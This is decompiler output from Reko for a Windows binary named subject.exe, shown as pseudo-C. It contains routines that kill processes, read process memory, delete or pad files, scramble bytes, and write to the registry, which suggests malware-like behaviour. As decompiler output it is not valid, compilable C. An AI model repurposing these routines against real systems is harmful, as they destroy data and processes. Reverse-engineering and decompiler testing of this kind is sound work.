// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004013FA: Register word32 fn004013FA(Register word32 ebp, Register word32 esi, Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Register out ptr32 esiOut)
word32 fn004013FA(word32 ebp, word32 esi, Eq_5 dwArg04, Eq_5 dwArg08, ptr32 & esiOut)
{
	byte dl_13;
	fn00407460(0x0040E0C0, out dl_13);
	fn004052D3(0x00, 0x0040FDE0);
	up32 eax_26 = fn00403464(0x0040FBA1, 0x00);
	Eq_5 eax_37 = GetModuleFileNameA(0x00, fp - 0x0448, 0x0104);
	word32 esp_46;
	word32 ebp_47;
	byte SCZO_48;
	word32 ebx_49;
	byte SZO_50;
	bool C_51;
	word32 eax_52;
	word32 ecx_53;
	bool Z_54;
	word32 esi_55;
	word32 edi_56;
	byte CZ_57;
	byte dl_58;
	byte bl_59;
	KERNEL32.dll!CreateToolhelp32Snapshot();
	word32 * esp_66;
	struct Eq_60 * ebp_67;
	byte SCZO_68;
	word32 ebx_69;
	byte SZO_70;
	bool C_71;
	word32 eax_72;
	word32 ecx_73;
	bool Z_74;
	word32 esi_75;
	word32 edi_76;
	byte CZ_77;
	byte dl_78;
	byte bl_79;
	KERNEL32.dll!Module32First();
	if (eax_72 != 0x00)
	{
		*(esp_66 - 0x04) = fp - 0x0224;
		*(esp_66 - 0x08) = fp - 288;
		word32 edi_119;
		Eq_5 ecx_120 = fn00407370(dwArg00, out edi_119);
		*(esp_66 - 0x0C) = fp - 288;
		*(esp_66 - 0x10) = fp - 0x0448;
		if (fn0040C540(ecx_120, dwArg00, dwArg04) == 0x00)
			goto l004015EF;
		*(esp_66 - 0x04) = dwLoc033C;
		*(esp_66 - 0x08) = 0x00;
		*(esp_66 - 0x0C) = 0x001F0FFF;
		Eq_5 eax_140 = OpenProcess(*(esp_66 - 0x0C), *(esp_66 - 0x08), *(esp_66 - 0x04));
		if (eax_140 != 0x00)
		{
			*(esp_66 - 0x04) = esi_75;
			*(esp_66 - 0x08) = edi_119;
			*(esp_66 - 0x0C) = 0x00080000;
			*(esp_66 - 0x10) = 0x00;
			*(esp_66 - 0x14) = 0x00411970;
			fn00407310(dwArg00, bArg04, dwArg08);
			up32 eax_161 = dwLoc032C;
			if (dwLoc032C >= 0x00080000)
				eax_161 = 0x00080000;
			if (dwArg08 == 0x00)
			{
				*(esp_66 - 0x0C) = fp - 0x0C;
				*(esp_66 - 0x10) = eax_161;
				*(esp_66 - 0x14) = 0x00411970;
				*(esp_66 - 0x18) = dwLoc0330;
				*(esp_66 - 0x1C) = (union Eq_5 *) eax_140;
				if (ReadProcessMemory(*(esp_66 - 0x1C), *(esp_66 - 0x18), *(esp_66 - 0x14), *(esp_66 - 0x10), *(esp_66 - 0x0C)) == 0x00)
				{
l004015E1:
					*(esp_66 - 0x0C) = *(ebp_67 - 0x0C);
					CloseHandle(*(esp_66 - 0x0C));
					*(esp_66 - 0x0C) = 0x01;
					word32 esi_190;
					*esiOut = *(esp_66 - 0x04);
					goto l004015EF;
				}
			}
			if (eax_26 > 0x00)
			{
				do
				{
					word32 eax_223;
					*(esp_66 - 0x0C) = ebp_67->dw0008;
					*(esp_66 - 0x10) = 0x0040FBA1;
					Eq_5 eax_211 = fn00403434(dwArg00, 0x00);
					*(esp_66 - 0x14) = (union Eq_5 *) eax_211;
					*(ebp_67 - 0x10) = (union Eq_5 *) eax_211;
					byte dl_215;
					Eq_5 eax_216 = fn00407460(dwArg00, out dl_215);
					up32 esi_217 = 0x00411970;
					byte bl_222 = (byte) eax_216;
					if (ebp_67->dw000C != 0x00)
					{
						*(ebp_67 - 0x08) = (word32) eax_216 + 110;
						eax_223 = (word32) eax_216 + 110;
					}
					else
						eax_223 = *(ebp_67 - 0x08);
					if (eax_223 - eax_216 != 0x0A)
					{
						do
						{
							*(esp_66 - 0x0C) = *(ebp_67 - 0x14);
							word32 edi_249 = esi_217 + 0x00;
							*(esp_66 - 0x10) = edi_249;
							*(esp_66 - 0x14) = 0x0040E0C0;
							byte dl_254;
							byte bl_255;
							if (fn0040C490(dl_215, bl_222, dwArg00, null, dwArg08, out dl_254, out bl_255) == 0x00)
							{
l004015CB:
								ebp_67->dw0008 = *(ebp_67 - 0x04) + 0x01;
								break;
							}
							if (ebp_67->dw000C != 0x00)
							{
l0040158B:
								*(esp_66 - 0x0C) = 0x00;
								*(esp_66 - 0x10) = *(ebp_67 - 0x0C);
								TerminateProcess(*(esp_66 - 0x10), *(esp_66 - 0x0C));
								*(esp_66 - 0x0C) = 0x32;
								Sleep(*(esp_66 - 0x0C));
								*(esp_66 - 0x0C) = 0x01;
								*(esp_66 - 0x10) = 0x0040FDCC;
								*(esp_66 - 0x14) = (union Eq_5 *) fn00403434(dwArg00, 0x00);
								*(esp_66 - 0x18) = ebp_67 - 0x011C;
								if (fn00403B7D(ebp_67, dwArg00, 0x00) == 0x00)
								{
									*(esp_66 - 0x0C) = ebp_67 - 0x011C;
									fn00403DFA(dwArg00);
								}
								goto l004015CB;
							}
							*(esp_66 - 0x0C) = (union Eq_5 *) eax_216;
							*(esp_66 - 0x10) = edi_249;
							*(esp_66 - 0x14) = *(ebp_67 - 0x10);
							if (fn0040C490(dl_254, bl_255, dwArg00, null, dwArg08, out dl_215, out bl_222) == 0x00)
								goto l0040158B;
							esi_217 = esi_217 + 0x01;
						} while (esi_217 < (*(ebp_67 - 0x08) - eax_216) - 0x0A);
					}
					ebp_67->dw0008 = ebp_67->dw0008 + 0x01;
				} while (ebp_67->dw0008 < *(ebp_67 - 0x04));
			}
			goto l004015E1;
		}
	}
l004015EF:
	*(esp_66 - 0x04) = *(ebp_67 - 0x18);
	CloseHandle(*(esp_66 - 0x04));
	return *esp_66;
}

// 0040174B: void fn0040174B()
void fn0040174B()
{
}

// 0040174E: Register Eq_5 fn0040174E(Register (ptr32 Eq_580) ecx, Stack Eq_5 dwArg04, Stack (ptr32 Eq_5) dwArg08, Stack word32 dwArg0C, Register out ptr32 ecxOut)
Eq_5 fn0040174E(Eq_580 * ecx, Eq_5 dwArg04, Eq_5 * dwArg08, word32 dwArg0C, ptr32 & ecxOut)
{
	ecx->t0000.u0 = 0x00;
	ecx->t0004.u0 = 0x00;
	ecx->t0008.u0 = 0x00;
	word32 ecx_31;
	*ecxOut = 0x04;
	Eq_5 eax_182 = 0x80000000;
	Eq_5 ebx_183 = 0x02;
	Eq_5 dwLoc0C_184 = 0x04;
	if (dwArg0C == 0x00)
	{
		eax_182.u0 = 0xC0000000;
		ebx_183.u0 = 0x04;
		dwLoc0C_184.u0 = 0x02;
	}
	Eq_5 eax_129;
	if (dwArg04 != 0x00)
	{
		Eq_5 eax_162 = CreateFileA(dwArg04, eax_182, 0x01, null, 0x03, 0x20, 0x00);
		ecx->t0000 = eax_162;
		if (eax_162 == ~0x00)
			goto l004017FF;
		Eq_5 eax_172 = GetFileSize(eax_162, fp - 0x08);
		ecx->t000C = eax_172;
		word32 ecx_167;
		*ecxOut = fp - 0x08;
		if (false)
		{
l004017D2:
			CloseHandle(ecx->t0000);
			goto l004017FF;
		}
		word32 ecx_178;
		*ecxOut = dwArg08;
		if (dwArg08 != null)
			*dwArg08 = (union Eq_5 *) eax_172;
	}
	Eq_5 eax_113 = CreateFileMappingA(ecx->t0000, null, ebx_183, 0x00, 0x00, 0x00);
	ecx->t0004 = eax_113;
	if (eax_113 != 0x00)
	{
		eax_129 = MapViewOfFile(eax_113, dwLoc0C_184, 0x00, 0x00, 0x00);
		ecx->t0008 = eax_129;
		if (eax_129 != 0x00)
			return eax_129;
		CloseHandle(ecx->t0004);
		CloseHandle(ecx->t0000);
l004017FF:
		eax_129.u0 = 0x00;
		return eax_129;
	}
	goto l004017D2;
}

// 00401808: void fn00401808(Register (ptr32 Eq_712) ecx)
void fn00401808(Eq_712 * ecx)
{
	struct Eq_712 * esi_33 = ecx;
	Eq_5 eax_11 = ecx->t0008;
	if (eax_11 != 0x00)
		UnmapViewOfFile(eax_11);
	Eq_5 eax_18 = ecx->t0004;
	if (eax_18 != 0x00)
		CloseHandle(eax_18);
	if (ecx->dw0000 != 0x00)
		CloseHandle(*esp_49);
	esi_33->dw0000 = esi_33->dw0000 & 0x00;
	esi_33->t0004 = esi_33->t0004 & 0x00;
	esi_33->t0008 = esi_33->t0008 & 0x00;
}

// 00402642: Register word32 fn00402642(Stack (ptr32 word32) dwArg04, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00402642(word32 * dwArg04, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 * esp_197;
	Eq_5 eax_16 = GetCurrentProcessId();
	*dwArg04 = 0x00;
	Eq_5 eax_41 = OpenProcess(0x001F0FFF, 0x00, eax_16);
	Eq_5 dwLoc0C_178 = 0x00;
	word32 dwLoc20_338 = 0x00;
	if (OpenProcessToken(eax_41, 0x08, fp - 0x14) == 0x00)
	{
l004026A5:
		GetLastError();
		esp_197 = fp - 0x40;
		goto l004026AB;
	}
	Eq_5 eax_219 = LocalAlloc(0x00, 0x32);
	dwLoc0C_178 = eax_219;
	if (eax_219 == 0x00)
		goto l004026A5;
	word32 * esp_239 = fp - 0x44;
	if (GetTokenInformation(0x00, SLICE(0x00, TOKEN_INFORMATION_CLASS, 32), 0x02, eax_219, (DWORD *) 0x32) != 0x00)
	{
l00402719:
		PSID ** esp_275 = esp_239 - 0x04;
		*esp_275 = (PSID **) (fp - 0x1C);
		*(esp_275 - 0x04) = 0x00;
		*(esp_275 - 0x08) = 0x00;
		*(esp_275 - 0x0C) = 0x00;
		*(esp_275 - 0x10) = 0x00;
		*(esp_275 - 0x14) = 0x00;
		*(esp_275 - 0x18) = 0x00;
		*(esp_275 - 0x1C) = 0x00;
		*(esp_275 - 0x20) = 0x04;
		*(esp_275 - 0x24) = 0x01;
		*(esp_275 - 0x28) = fp - 44;
		if (AllocateAndInitializeSid(*(esp_275 - 0x28), *(esp_275 - 0x24), *(esp_275 - 0x20), *(esp_275 - 0x1C), *(esp_275 - 0x18), *(esp_275 - 0x14), *(esp_275 - 0x10), *(esp_275 - 0x0C), *(esp_275 - 0x08), *(esp_275 - 0x04), *esp_275) != 0x00)
		{
			*esp_275 = (PSID **) (fp - 0x18);
			*(esp_275 - 0x04) = 0x00;
			*(esp_275 - 0x08) = 0x00;
			*(esp_275 - 0x0C) = 0x00;
			*(esp_275 - 0x10) = 0x00;
			*(esp_275 - 0x14) = 0x00;
			*(esp_275 - 0x18) = 0x00;
			*(esp_275 - 0x1C) = 0x00;
			*(esp_275 - 0x20) = 0x06;
			*(esp_275 - 0x24) = 0x01;
			*(esp_275 - 0x28) = fp - 44;
			if (AllocateAndInitializeSid(*(esp_275 - 0x28), *(esp_275 - 0x24), *(esp_275 - 0x20), *(esp_275 - 0x1C), *(esp_275 - 0x18), *(esp_275 - 0x14), *(esp_275 - 0x10), *(esp_275 - 0x0C), *(esp_275 - 0x08), *(esp_275 - 0x04), *esp_275) != 0x00)
			{
				up32 dwArg04_333 = 0x00;
				if (*dwLoc0C_178 > 0x00)
				{
					word32 esi_351 = dwLoc0C_178 + 0x04;
					do
					{
						PSID * esp_358 = esp_239 - 0x04;
						*esp_358 = (PSID *) null;
						word32 eax_360 = *esi_351;
						*(esp_358 - 0x04) = eax_360;
						if (EqualSid(*(esp_358 - 0x04), *esp_358) != 0x00)
						{
							*dwArg04 = 0x00;
							dwLoc20_338 = 0x01;
							break;
						}
						*esp_358 = (PSID *) null;
						*(esp_358 - 0x04) = eax_360;
						if (EqualSid(*(esp_358 - 0x04), *esp_358) != 0x00)
						{
							*dwArg04 = 0x01;
							dwLoc20_338 = 0x00;
							break;
						}
						up32 v26_382 = dwArg04_333 + 0x01;
						dwArg04_333 = v26_382;
						esi_351 = esi_351 + 0x08;
					} while (v26_382 < *dwLoc0C_178);
				}
				esp_197 = esp_239;
				if (*dwArg04 == 0x00 && dwLoc20_338 == 0x00)
					*dwArg04 = 0x01;
l004027C5:
				if (0x00 != 0x00)
				{
					PSID * esp_172 = esp_197 - 0x04;
					*esp_172 = (PSID *) null;
					FreeSid(*esp_172);
				}
				word32 * esp_158 = esp_197;
				if (0x00 != 0x00)
				{
					PSID * esp_156 = esp_197 - 0x04;
					*esp_156 = (PSID *) null;
					FreeSid(*esp_156);
				}
				if (dwLoc0C_178 != 0x00)
				{
					union Eq_5 * esp_151 = esp_158 - 0x04;
					*esp_151 = (union Eq_5 *) dwLoc0C_178;
					LocalFree(*esp_151);
				}
				if (0x00 != 0x00)
				{
					union Eq_5 * esp_146 = esp_158 - 0x04;
					*esp_146 = (union Eq_5 *) 0x00;
					CloseHandle(*esp_146);
				}
				word32 * esp_107 = esp_158;
				if (eax_41 != 0x00)
				{
					union Eq_5 * esp_130 = esp_158 - 0x04;
					*esp_130 = (union Eq_5 *) eax_41;
					CloseHandle(*esp_130);
				}
				struct Eq_1272 * esp_119 = esp_107 + 0x01;
				word32 edi_118;
				*ediOut = *esp_107;
				word32 esi_120;
				*esiOut = esp_119->dw0000;
				return esp_119->dw0004;
			}
		}
		goto l00402753;
	}
	else
	{
		if (GetLastError() == 122)
		{
			LocalFree(eax_219);
			Eq_5 eax_406 = LocalAlloc(0x00, 0x32);
			dwLoc0C_178 = eax_406;
			if (eax_406 != 0x00)
			{
				esp_239 = fp - 0x48;
				if (GetTokenInformation(0x00, SLICE(0x00, TOKEN_INFORMATION_CLASS, 32), 0x02, eax_406, (DWORD *) 0x32) != 0x00)
					goto l00402719;
			}
		}
l00402753:
		GetLastError();
l004026AB:
		goto l004027C5;
	}
}

// 00403434: Register Eq_5 fn00403434(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
Eq_5 fn00403434(Eq_5 dwArg04, Eq_5 dwArg08)
{
	Eq_5 esi_28 = dwArg04;
	Eq_5 edi_10 = 0x00;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte dl_40;
			if (fn00407460(esi_28, out dl_40) == 0x00)
				return esi_28;
			edi_10 = (word32) edi_10 + 0x01;
			byte dl_49;
			esi_28 = (word32) fn00407460(esi_28, out dl_49) + ((word32) esi_28 + 0x01);
		} while (edi_10 < dwArg08);
	}
	return esi_28;
}

// 00403464: Register word32 fn00403464(Stack Eq_5 dwArg04, Stack int32 dwArg08)
word32 fn00403464(Eq_5 dwArg04, int32 dwArg08)
{
	Eq_5 esi_17 = dwArg04;
	word32 edi_10 = 0x00;
	while (true)
	{
		byte dl_21;
		Eq_5 eax_22 = fn00407460(esi_17, out dl_21);
		if (eax_22 == 0x00 || dwArg08 != 0x00 && esi_17 - dwArg04 >= dwArg08)
			break;
		esi_17 = (word32) eax_22 + ((word32) esi_17 + 0x01);
		edi_10 = edi_10 + 0x01;
	}
	return edi_10;
}

// 00403496: Register word32 fn00403496(Register word32 esi, Register out ptr32 ediOut)
word32 fn00403496(word32 esi, ptr32 & ediOut)
{
	struct Eq_1343 * esp_14 = fp - 0x08;
	int32 edi_13 = 0x00;
	do
	{
		struct Eq_1343 * esp_16 = esp_14 - 0x04;
		esp_16->dw0000 = 0x00;
		byte dl_33 = (byte) (uint32) ((uint64) (uint32) fn00404687(dwArg00) % ((0x00 - (-edi_13 == 0x00) & 0xF8) + 0x08));
		byte * eax_36 = esp_16->dw000C + edi_13;
		*eax_36 = dl_33;
		esp_14 = esp_16;
		if (dl_33 == 0x00)
			*eax_36 = 0x01;
		edi_13 = edi_13 + 0x01;
	} while (edi_13 < 0x04);
	word32 edi_45;
	*ediOut = esp_16->dw0000;
	return esp_16->dw0004;
}

// 004034CD: void fn004034CD(Stack word32 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Stack byte bArg0F)
void fn004034CD(word32 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, byte bArg0F)
{
	Eq_5 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = *dwArg0C;
	byte al_21 = *((word32) dwArg0C + 0x01);
	if (dwArg08 > 0x00)
	{
		do
		{
			ui8 * eax_78 = (word32) dwLoc0C_11 + dwArg04;
			*eax_78 = __rol(*eax_78, cl_20) ^ al_21;
			Eq_5 v18_123 = (word32) dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
}

// 00403529: void fn00403529(Stack Eq_5 dwArg04, Stack int32 dwArg08, Stack (ptr32 Eq_1440) dwArg0C, Stack byte bArg0F)
void fn00403529(Eq_5 dwArg04, int32 dwArg08, Eq_1440 * dwArg0C, byte bArg0F)
{
	int32 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = dwArg0C->b0000;
	byte al_21 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte * eax_78 = (word32) dwArg04 + dwLoc0C_11;
			*eax_78 = __ror(*eax_78 ^ al_21, cl_20);
			int32 v18_123 = dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
}

// 00403585: Register byte fn00403585(Register (ptr32 byte) ebx, Stack Eq_5 dwArg00)
byte fn00403585(byte * ebx, Eq_5 dwArg00)
{
	byte al_47;
	byte bl_27 = (byte) dwArg00;
	ptr32 esp_101 = fp - 0x10;
	uint32 esi_100 = (uint32) ((uint64) (uint32) fn00404687(0x00) % 0x1A) + 0x61;
	if (dwArg00 != 0x04)
	{
		if (dwArg00 == 0x01)
		{
			al_47 = (byte) ((uint32) ((uint64) (uint32) fn00404687(0x00) % 0x0A) + 0x30);
			return al_47;
		}
		if ((bl_27 & 0x02) != 0x00)
		{
			esp_101 = fp - 0x14;
			esi_100 = (uint32) ((uint64) (uint32) fn00404687(0x00) % 0x1A) + 0x41;
		}
		word32 * esp_102 = esp_101 - 0x04;
		*esp_102 = 0x00;
		word32 * esp_111 = esp_102;
		if (((byte) fn00404687(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x04) != 0x00)
		{
			*(esp_102 - 0x04) = 0x00;
			uint64 edx_eax_158 = (uint64) (uint32) fn00404687(dwArg00);
			*(esp_102 - 0x08) = 0x1A;
			esp_111 = esp_102 - 0x04;
			esi_100 = (uint32) (edx_eax_158 % *(esp_102 - 0x08)) + 0x61;
		}
		word32 * esp_117 = esp_111 - 0x04;
		*esp_117 = 0x00;
		if (((byte) fn00404687(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x01) != 0x00)
		{
			*(esp_117 - 0x04) = 0x00;
			uint64 edx_eax_137 = (uint64) (uint32) fn00404687(dwArg00);
			*(esp_117 - 0x08) = 0x0A;
			esi_100 = (uint32) (edx_eax_137 % *(esp_117 - 0x08)) + 0x30;
		}
	}
	al_47 = (byte) esi_100;
	return al_47;
}

// 00403624: void fn00403624(Register Eq_5 ebx, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C)
void fn00403624(Eq_5 ebx, Eq_5 dwArg08, Eq_5 dwArg0C)
{
	struct Eq_1619 * esp_10 = fp - 0x0C;
	Eq_5 esi_15 = dwArg08;
	if (dwArg0C > dwArg08)
	{
		esp_10 = fp - 0x10;
		esi_15 = (word32) dwArg08 + (uint32) ((uint64) ((uint32) fn00404687(0x00)) % (dwArg0C - dwArg08));
	}
	byte * ebx_32 = esp_10->ptr0010;
	Eq_5 edi_33 = 0x00;
	if (esi_15 > 0x00)
	{
		do
		{
			*(esp_10 - 0x04) = esp_10->dw001C;
			Mem67[edi_33 + ebx_32:byte] = fn00403585(ebx_32, ebx);
			edi_33 = (word32) edi_33 + 0x01;
		} while (edi_33 < esi_15);
	}
	word32 * esp_41 = esp_10 - 0x04;
	*esp_41 = 0x02;
	*ebx_32 = fn00403585(ebx_32, ebx);
	Mem48[edi_33 + ebx_32:byte] = Mem46[edi_33 + ebx_32:byte] & 0x00;
	*esp_41 = 0x01;
}

// 00403B7D: Register word32 fn00403B7D(Register (ptr32 Eq_60) ebp, Stack Eq_5 dwArg04, Stack word32 dwArg08)
word32 fn00403B7D(Eq_60 * ebp, Eq_5 dwArg04, word32 dwArg08)
{
	fn00407B80(0x2000, dwLoc08);
	*(fp - 0x08) = (union Eq_5 *) dwArg04;
	*(fp - 0x0C) = fp + ~0x2003;
	word32 edi_16;
	fn00407370(dwArg00, out edi_16);
	*(fp - 0x10) = dwArg08;
	*(fp - 0x14) = fp + ~0x1003;
	word32 edi_25;
	fn00407370(dwArg00, out edi_25);
	*(fp - 0x18) = fp + ~0x2003;
	fn0040C5CC(fp - 0x04, dwArg00);
	*(fp - 0x1C) = fp + ~0x1003;
	fn0040C5CC(fp - 0x04, dwArg00);
	*(fp - 0x20) = fp + ~0x1003;
	*(fp - 0x24) = fp + ~0x2003;
	return fn00407FC0(dwArg00, dwArg04);
}

// 00403BD8: void fn00403BD8(Register word32 esi, Stack Eq_5 dwArg04)
void fn00403BD8(word32 esi, Eq_5 dwArg04)
{
	word32 edi_12;
	fn00407370(dwArg04, out edi_12);
	*(fp - 0x10) = fp->dw0008;
	*(fp - 0x14) = 0x0040F244;
	*(fp - 0x18) = (union Eq_5 *) fn00403434(dwArg00, dwArg04);
	*(fp - 0x1C) = fp->dw0004;
	fn00407380(dwArg00);
}

// 00403CBB: void fn00403CBB(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C)
void fn00403CBB(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C)
{
	Eq_5 eax_29 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x20, 0x00);
	if (eax_29 != ~0x00 && dwArg08 != 0x00)
	{
		WriteFile(eax_29, dwArg08, dwArg0C, fp + 0x04, null);
		CloseHandle(eax_29);
	}
}

// 00403D58: Register word32 fn00403D58(Stack Eq_5 dwArg04)
word32 fn00403D58(Eq_5 dwArg04)
{
	fn0040174B();
	word32 ecx_19;
	if (fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x01, out ecx_19) == null)
		return 0x00;
	fn00401808(fp - 0x18);
	return 0x01;
}

// 00403DFA: void fn00403DFA(Stack Eq_5 dwArg04)
void fn00403DFA(Eq_5 dwArg04)
{
	SetFileAttributesA(dwArg04, 0x20);
	DeleteFileA(dwArg04);
}

// 00403F63: void fn00403F63(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
void fn00403F63(Eq_5 dwArg04, Eq_5 dwArg08)
{
	if (dwArg08 < 0x00013000)
		return;
	SetFileAttributesA(dwArg04, 0x20);
	Eq_5 eax_98 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x03, 0x20, 0x00);
	Eq_5 edi_100 = eax_98;
	if (eax_98 == ~0x00)
		return;
	ptr32 esp_132;
	Eq_5 eax_108 = GetFileSize(eax_98, fp - 0x08);
	if (eax_108 > dwArg08)
	{
		SetFilePointer(eax_98, dwArg08, null, 0x00);
		SetEndOfFile(eax_98);
		esp_132 = fp - 0x14;
	}
	else
	{
		SetFilePointer(eax_98, 0x00, null, 0x02);
		int32 eax_175 = (int32) ((int64) (dwArg08 - eax_108) / 0x00080000);
		if (eax_175 > 0x00)
		{
			int32 dwArg08_211 = eax_175;
			do
			{
				WriteFile(eax_98, 0x00411970, 0x00080000, fp - 0x08, null);
				int32 v20_226 = dwArg08_211 - 0x01;
				dwArg08_211 = v20_226;
			} while (v20_226 != 0x00);
		}
		WriteFile(esp_196->t0000, esp_196->t0004, esp_196->t0008, esp_196->t000C, esp_196->t0010);
	}
	union Eq_5 * esp_133 = esp_132 - 0x04;
	*esp_133 = (union Eq_5 *) edi_100;
	CloseHandle(*esp_133);
	*esp_133 = (union Eq_5 *) 0x01;
}

// 0040451C: void fn0040451C(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Stack Eq_5 dwArg10)
void fn0040451C(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, Eq_5 dwArg10)
{
	if (RegCreateKeyA(dwArg04, dwArg08, fp + 0x08) != 0x00)
		return;
	byte dl_50;
	RegSetValueExA(dwArg08, dwArg0C, 0x00, 0x01, dwArg10, fn00407460(dwArg10, out dl_50));
	RegCloseKey(dwArg08);
}

// 00404562: void fn00404562(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Stack Eq_5 dwArg10)
void fn00404562(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, Eq_5 dwArg10)
{
	word32 esi_116 = 0x00;
	ptr32 esp_120 = fp - 0x0114;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == 0x00)
	{
		while (true)
		{
			union Eq_5 * esp_50 = esp_120 - 0x04;
			*esp_50 = (union Eq_5 *) 0x0104;
			*(esp_50 - 0x04) = fp - 0x0110;
			*(esp_50 - 0x08) = esi_116;
			*(esp_50 - 0x0C) = (union Eq_5 *) dwLoc08;
			Eq_5 eax_60 = RegEnumKeyA(*(esp_50 - 0x0C), *(esp_50 - 0x08), *(esp_50 - 0x04), *esp_50);
			esp_120 = (char *) esp_50 + 0x04;
			if (eax_60 != 0x00)
				break;
			if (dwArg0C != eax_60)
			{
				ui32 v13_92 = dwLoc0C & eax_60;
				*esp_50 = (union Eq_5 *) dwArg10;
				*(esp_50 - 0x04) = fp - 0x0C;
				*(esp_50 - 0x08) = fp - 0x0110;
				*(esp_50 - 0x0C) = (union Eq_5 *) dwArg08;
				*(esp_50 - 0x10) = (union Eq_5 *) dwArg04;
				dwLoc0C = v13_92;
				word32 esp_112;
				word32 ebp_113;
				byte SCZO_114;
				word32 eax_115;
				byte SZO_117;
				bool C_118;
				bool Z_119;
				dwArg0C();
				esp_120 = esp_112 + 0x14;
				if (v13_92 != 0x00)
					goto l004045D2;
			}
			esi_116 = esi_116 + 0x01;
		}
		*esp_50 = (union Eq_5 *) 0x01;
		esp_120 = (char *) esp_50 + 0x04;
l004045D2:
		union Eq_5 * esp_74 = esp_120 - 0x04;
		*esp_74 = (union Eq_5 *) dwLoc08;
		RegCloseKey(*esp_74);
	}
}

// 004045E0: void fn004045E0(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5 dwArg0C, Stack Eq_662 dwArg10)
void fn004045E0(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5 dwArg0C, LPDWORD dwArg10)
{
	word32 ebx_114 = 0x00;
	ptr32 esp_116 = fp - 0x0820;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == 0x00)
	{
		while (true)
		{
			LPDWORD * esp_62 = esp_116 - 0x04;
			*esp_62 = (LPDWORD *) (fp - 0x0C);
			*(esp_62 - 0x04) = fp + ~0x0817;
			*(esp_62 - 0x08) = fp - 0x18;
			*(esp_62 - 0x0C) = 0x00;
			*(esp_62 - 0x10) = fp - 0x14;
			*(esp_62 - 0x14) = fp - 0x0418;
			*(esp_62 - 0x18) = ebx_114;
			*(esp_62 - 0x1C) = (union Eq_5 *) dwLoc08;
			Eq_5 eax_85 = RegEnumValueA(*(esp_62 - 0x1C), *(esp_62 - 0x18), *(esp_62 - 0x14), *(esp_62 - 0x10), *(esp_62 - 0x0C), *(esp_62 - 0x08), *(esp_62 - 0x04), *esp_62);
			esp_116 = (char *) esp_62 + 0x04;
			if (eax_85 != 0x00)
				break;
			if (dwLoc18 == 0x01 && dwArg0C != eax_85)
			{
				ui32 v14_122 = dwLoc10 & eax_85;
				*esp_62 = (LPDWORD *) dwArg10;
				*(esp_62 - 0x04) = fp - 0x10;
				*(esp_62 - 0x08) = fp - 0x0418;
				*(esp_62 - 0x0C) = (union Eq_5 *) dwArg08;
				*(esp_62 - 0x10) = (union Eq_5 *) dwArg04;
				dwLoc10 = v14_122;
				word32 esp_142;
				word32 ebp_143;
				byte SCZO_144;
				word32 eax_146;
				word32 esi_147;
				byte SZO_148;
				bool C_149;
				bool Z_150;
				dwArg0C();
				esp_116 = esp_142 + 0x14;
				if (v14_122 != 0x00)
					goto l00404678;
			}
			ebx_114 = ebx_114 + 0x01;
		}
		*esp_62 = (LPDWORD *) (DWORD *) 0x01;
		esp_116 = (char *) esp_62 + 0x04;
l00404678:
		union Eq_5 * esp_100 = esp_116 - 0x04;
		*esp_100 = (union Eq_5 *) dwLoc08;
		RegCloseKey(*esp_100);
	}
}

// 00404687: Register word32 fn00404687(Stack Eq_5 dwArg04)
word32 fn00404687(Eq_5 dwArg04)
{
	if (dwArg04 != 0x00 || globals->dw41196C == 0x00)
	{
		fn00407B55(GetTickCount());
		globals->dw41196C = fn00407B5F();
	}
	return fn00407B5F();
}

// 004046B3: Register ui32 fn004046B3(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08)
ui32 fn004046B3(Eq_5 dwArg04, Eq_5 dwArg08)
{
	fn00407310(fp - 88, 0x00, 0x44);
	return 0x00 - (-CreateProcessA(dwArg04, dwArg08, null, null, 0x00, 0x00, 0x00, 0x00, fp - 88, fp - 0x14) == 0x00) & dwLoc14;
}

// 004048CB: Register Eq_5 fn004048CB(Register Eq_5 ebx, Register ptr32 ebp, Register word32 esi, Register out ptr32 ediOut)
Eq_5 fn004048CB(Eq_5 ebx, ptr32 ebp, word32 esi, ptr32 & ediOut)
{
	*ediOut = edi;
	if (globals->t491E88 == 0x00)
		fn00404562(0x80000002, fn00403434(0x0040F244, 0x04), 0x004047FD, fp - 0x08);
	else
	{
		fn00403BD8(esi, fp - 0x041C);
		*(fp - 0x052C) = fp - 0x041C;
		*(fp - 0x0530) = 4790904;
		word32 edi_186;
		fn00407370(dwArg00, out edi_186);
		*(fp - 1332) = fp - 0x08;
		*(fp - 1336) = 0x00404769;
		*(fp - 0x053C) = fp - 0x041C;
		*(fp - 0x0540) = 0x80000002;
		fn004045E0(dwArg00, dwArg04, dwArg08, dwArg0C);
	}
	globals->dw491E8C = dwLoc08 & 0x00;
